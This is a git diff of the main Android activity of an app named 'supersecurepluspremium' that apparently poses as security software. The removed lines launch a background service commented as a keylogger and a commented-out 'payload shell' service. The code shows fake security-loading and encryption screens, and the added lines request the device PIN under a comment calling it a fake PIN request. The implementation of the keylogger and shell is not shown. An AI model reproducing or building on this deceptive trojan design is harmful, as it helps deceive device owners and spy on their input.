@@ -2,6 +2,9 @@ package com.example.supersecurepluspremium;
 
 import androidx.appcompat.app.AppCompatActivity;
 
+import android.annotation.SuppressLint;
+import android.app.KeyguardManager;
+import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
 import android.os.Handler;
@@ -16,60 +19,86 @@ import com.bumptech.glide.Glide;
 import java.util.Timer;
 import java.util.TimerTask;
 
-//code d'un sleep (pas bien pour les GIF
-/*try {
-       Thread.wait(5000); //pause de 1000ms (1s)
-} catch(InterruptedException ex) {
-       ex.printStackTrace();
-}*/
-//myIntent.putExtra("key", value); //Optional parameters for Intent
-
 public class MainActivity extends AppCompatActivity {
     private static int LOAD_TIME = 2000;
+    private static boolean authenticated = false;
     private static boolean scanning = false;
 
-    //Faux écran de chargement
-    public void doLoad(View v){
+    private static int ACTIVITY_LOCK = 4;
+    private static int ACTIVITY_FIRST_LOAD = 3;
+
+    private void unlock_screen() {
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
+            KeyguardManager km = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
+            if (km.isKeyguardSecure()) {
+                Intent authIntent = km.createConfirmDeviceCredentialIntent(getString(R.string.dialog_title_auth), getString(R.string.dialog_msg_auth));
+                startActivityForResult(authIntent, ACTIVITY_LOCK);
+            }
+        }
+    }
+
+    // Demande de faux PIN
+    public void firstLaunch(View v) {
         final ImageView myLayout = findViewById(R.id.imageView);
-        Glide.with(this).load(R.drawable.loading).into(myLayout);  //insere notre gif dans la imageView
         TextView textView = findViewById(R.id.textView2);
 
-        if (!scanning)  // loading screen
-            textView.setText("Chargement de la sécurité\nVeuillez patienter...");
-        else    // faux "scan de sécurité"
-            textView.setText("Cryptage des données...");
-            Runnable runnable = new Runnable() {
-            @Override
-            public void run() {
-                Intent i = new Intent(MainActivity.this, Analyze.class);
-                i.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
-                startActivityForResult(i, 1);
+        if (!authenticated)  // Demande le code PIN
+        {
+            //Log.v("secme", "Ask for PIN - main");
+            unlock_screen();
+            try {
+                Thread.sleep(1000);
+            } catch(InterruptedException ex) {
+                ex.printStackTrace();
             }
-        };
-        Handler handler = new Handler();
-        handler.postDelayed(runnable, LOAD_TIME);
+            Glide.with(this).load(R.drawable.icon).into(myLayout);  //image warning
+        } else {
+            if (scanning) {
+                //Log.v("secme", "Already scanning ! - main");
+                return;
+            }
+            scanning = true;
+            //Log.v("secme", "Load app - main");
+            Glide.with(this).load(R.drawable.loading).into(myLayout);  //insere notre gif dans la imageView
+            textView.setText("Chargement de la sécurité\nVeuillez patienter...");
+            Runnable runnable = new Runnable() {
+                @Override
+                public void run() {
+                    //Log.v("secme", "DONE");
+                    scanning = false;
+                    Intent i = new Intent(MainActivity.this, Analyze.class);
+                    i.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                    startActivityForResult(i, ACTIVITY_FIRST_LOAD);
+                    return;
+                }
+            };
+            Handler handler = new Handler();
+            handler.postDelayed(runnable, LOAD_TIME);
+        }
     }
 
     //Démarrage de l'application
     @Override
-    protected void onCreate(Bundle savedInstanceState)  {
+    protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         ImageView imageView = findViewById(R.id.imageView);
-        Glide.with(this).load(R.drawable.annonce).into(imageView);
-        //service keylogger
-        startService(new Intent(this, BackgroundSecureService.class));
-        //payload shell
-        //startService(new Intent(this, BackgroundSecureShell.class));
-        Log.v("secme","Services launched - main");
+        Glide.with(this).load(R.drawable.annonce).into(imageView); //annonce code pin necessaire
     }
 
-    // Lancement d'un scan
+    // Lancement d'un scan après appui du bouton dans l'activité Analyze
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-        LOAD_TIME = 9000;
-        scanning = true;
-        doLoad(findViewById(R.id.imageView));
+        //Log.v("secme", "Trigger" + requestCode);
+        if (requestCode == ACTIVITY_LOCK) { //4
+            //Log.v("secme", "Correct PIN - main");
+            authenticated = true;
+        }
+        else if (requestCode == ACTIVITY_FIRST_LOAD) { //3
+            //Log.v("secme", "First load finished - main");
+            LOAD_TIME = 6000;
+            firstLaunch(findViewById(R.id.imageView));
+        }
     }
 }
